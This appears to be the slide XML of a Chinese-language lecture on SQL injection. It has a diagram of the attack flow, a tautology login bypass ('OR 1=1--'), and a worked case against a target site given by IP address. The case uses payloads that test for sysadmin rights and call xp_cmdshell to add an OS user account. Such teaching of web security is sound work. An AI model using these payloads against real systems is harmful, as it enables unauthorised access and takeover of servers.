        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2232025" y="2043113"/>
            <a:ext cx="1316038" cy="125412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0080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0080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Transactions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437293" name="Rectangle 45"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2428082" y="2043906"/>
            <a:ext cx="1316038" cy="123825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0080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0080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Communication</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437294" name="Rectangle 46"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2604294" y="2043906"/>
            <a:ext cx="1316038" cy="123825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0080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0080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Knowledge Mgmt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437295" name="Rectangle 47"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2788444" y="2043906"/>
            <a:ext cx="1316038" cy="123825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0080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0080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E-Commerce</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437296" name="Rectangle 48"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2974182" y="2043906"/>
            <a:ext cx="1316038" cy="123825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
          <a:scene3d>
            <a:camera prst="legacyPerspectiveTopRight"/>
            <a:lightRig rig="legacyFlat3" dir="b"/>
          </a:scene3d>
          <a:sp3d extrusionH="1801800" prstMaterial="legacyPlastic">
            <a:bevelT w="13500" h="13500" prst="angle"/>
            <a:bevelB w="13500" h="13500" prst="angle"/>
            <a:extrusionClr>
              <a:srgbClr val="008000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en-US" altLang="zh-CN" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Bus. Functions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437297" name="Rectangle 49"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="609600" y="1981200"/>
            <a:ext cx="838200" cy="950913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1"/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HTTP request</a:t>
            </a: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320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</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437298" name="Rectangle 50"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2819400" y="1944688"/>
            <a:ext cx="838200" cy="950912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr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SQL query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1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</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437299" name="Rectangle 51"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4648200" y="1868488"/>
            <a:ext cx="838200" cy="950912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1"/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DB Table</a:t>
            </a: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sym typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a: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altLang="zh-CN" sz="240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</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437300" name="Rectangle 52"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2438400" y="1905000"/>
            <a:ext cx="909638" cy="950913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1"/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HTTP response</a:t>
            </a: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 </a:t>
            </a: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sym typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="140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altLang="zh-CN" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="00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</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437301" name="Rectangle 53"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6372225" y="1346200"/>
            <a:ext cx="2422525" cy="11461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pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1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“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1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SELECT * FROM accounts WHERE acct=‘’ OR 1=1--’”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437302" name="Text Box 54"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6019800" y="2890838"/>
            <a:ext cx="3124200" cy="5381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</a:pP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</a:rPr>
              <a:t>1. Web</a:t>
            </a:r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程序提供了用户输入的表单；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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37303" name="Text Box 55"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6048375" y="3500438"/>
            <a:ext cx="3095625" cy="4968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</a:pP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</a:rPr>
              <a:t>2. </a:t>
            </a:r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攻击者通过填写表单数据发起攻击；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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37304" name="Text Box 56"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6056313" y="4130675"/>
            <a:ext cx="3124200" cy="5222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</a:pP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</a:rPr>
              <a:t>3. Web</a:t>
            </a:r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程序通过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</a:rPr>
              <a:t>SQL</a:t>
            </a:r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语句的形式将攻击递交给数据库；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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37305" name="Rectangle 57"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6019800" y="1341438"/>
            <a:ext cx="2963863" cy="13747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Account Summary</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1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Acct:5424-6066-2134-4334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Acct:4128-7574-3921-0192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Acct:5424-9383-2039-4029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Acct:4128-0004-1234-0293</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437306" name="Text Box 58"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6056313" y="4783138"/>
            <a:ext cx="3124200" cy="5175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</a:pP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</a:rPr>
              <a:t>4. </a:t>
            </a:r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数据库执行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</a:rPr>
              <a:t>SQL</a:t>
            </a:r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语句，将执行结果加密后返回给应用程序；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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37307" name="Text Box 59"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6056313" y="5445125"/>
            <a:ext cx="3124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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pP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</a:rPr>
              <a:t>5. </a:t>
            </a:r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应用程序解密数据，将结果发送给用户（攻击者）。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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60"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6156325" y="1341438"/>
            <a:ext cx="2613025" cy="1287462"/>
            <a:chOff x="5424" y="3360"/>
            <a:chExt cx="1646" cy="811"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="437309" name="Picture 6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424" y="3360"/>
              <a:ext cx="1646" cy="81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437310" name="Text Box 62"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5483" y="3504"/>
              <a:ext cx="501" cy="16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</a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="45720" rIns="45720">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="r" eaLnBrk="0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>Account:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill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437311" name="Text Box 63"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5472" y="3678"/>
              <a:ext cx="508" cy="16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</a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="45720" rIns="45720">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="r" eaLnBrk="0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>       </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>SKU:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea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437316" name="Text Box 68"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7026275" y="1522413"/>
            <a:ext cx="977900" cy="290512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1300" b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‘ OR 1=1 --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43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3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-0.00671 C -0.00191 0.04445 -0.00851 0.2375 0.00885 0.30093 C 0.02622 0.36435 0.06892 0.37153 0.10035 0.37431 C 0.13177 0.37709 0.17899 0.38218 0.19705 0.31783 C 0.21493 0.25347 0.20694 0.04259 0.20885 -0.0125 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4372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00" y="1910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3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37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3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3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3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-0.00486 C 0.00086 0.04583 -0.00799 0.23773 0.00885 0.30092 C 0.02569 0.36412 0.06892 0.37153 0.10034 0.3743 C 0.13177 0.37708 0.17899 0.38217 0.19705 0.31782 C 0.2151 0.25347 0.20711 0.04259 0.20902 -0.0125 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4372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00" y="19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3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37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3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3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0.00625 C 0.00225 0.05532 0.02031 0.23564 0.00885 0.30092 C -0.00261 0.3662 -0.03611 0.39236 -0.06789 0.39722 C -0.09966 0.40208 -0.16007 0.39444 -0.18143 0.32963 C -0.20278 0.26481 -0.19341 0.06203 -0.19584 0.00856 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="66" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4372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00" y="19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37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37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3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3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5 0.02847 C -0.00104 0.07407 0.01962 0.23958 0.00885 0.30092 C -0.00191 0.36227 -0.03611 0.39236 -0.06788 0.39722 C -0.09965 0.40208 -0.16007 0.39444 -0.18142 0.32963 C -0.20278 0.26481 -0.1934 0.06203 -0.19583 0.00856 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="83" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4373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00" y="177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97" grpId="0" animBg="1"/>
      <p:bldP spid="437298" grpId="0" animBg="1"/>
      <p:bldP spid="437298" grpId="1" animBg="1"/>
      <p:bldP spid="437299" grpId="0" animBg="1"/>
      <p:bldP spid="437299" grpId="1" animBg="1"/>
      <p:bldP spid="437300" grpId="0" animBg="1"/>
      <p:bldP spid="437301" grpId="0" animBg="1"/>
      <p:bldP spid="437304" grpId="0"/>
      <p:bldP spid="437305" grpId="0" animBg="1"/>
      <p:bldP spid="437306" grpId="0"/>
      <p:bldP spid="437307" grpId="0"/>
      <p:bldP spid="437316" grpId="0"/>
      <p:bldP spid="437316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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入示例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="438276" name="Picture 4" descr="sna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718" y="985838"/>
            <a:ext cx="8524875" cy="5689600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438277" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4643438" y="4292600"/>
            <a:ext cx="1512887" cy="21590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38280" name="AutoShape 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6804025" y="3357563"/>
            <a:ext cx="1008063" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -132833"/>
              <a:gd name="adj2" fmla="val 55870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en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>注入字符串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38281" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7019925" y="4300538"/>
            <a:ext cx="1223963" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -156356"/>
              <a:gd name="adj2" fmla="val -14574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FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>口令可以填写任意值</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1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438282" name="AutoShape 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3492500" y="5805488"/>
            <a:ext cx="1223963" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 91116"/>
              <a:gd name="adj2" fmla="val -63023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FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>查询到的用户资料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438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438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43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77" grpId="0" animBg="1"/>
      <p:bldP spid="438280" grpId="0" animBg="1"/>
      <p:bldP spid="438281" grpId="0" animBg="1"/>
      <p:bldP spid="43828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82613" y="1335088"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>靶网网址为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>http://26.28.249.154/asd/wyqy/</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像 1副本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5862" y="2281237"/>
            <a:ext cx="5919788" cy="347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58813" y="1420813"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>链接中加入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>”and 1 =1”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>后的返回结果</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像 3副本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6351" y="2386011"/>
            <a:ext cx="6419850" cy="316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30238" y="1382713"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>判断注入权限是否是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1" smtClean="0"/>
              <a:t>sysadmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>注入语句为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>and 1=(select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1" smtClean="0"/>
              <a:t>is_srvrolemember</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1" smtClean="0"/>
              <a:t>sysadmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>'))</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像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5350" y="2976562"/>
            <a:ext cx="6886575" cy="283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73088" y="1268413"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>下面的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>中包含的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>语句用来增加一个名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>用户（口令也为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>）。返回结果如图</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>10-6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>所示。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>http://26.28.249.154/asd/wyqy/shownews.asp?id=51;exec master..</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>xp_cmdshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t> 'net user test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t> /add'--</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像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8700" y="3386137"/>
            <a:ext cx="6838950" cy="265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7388" y="1411288"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
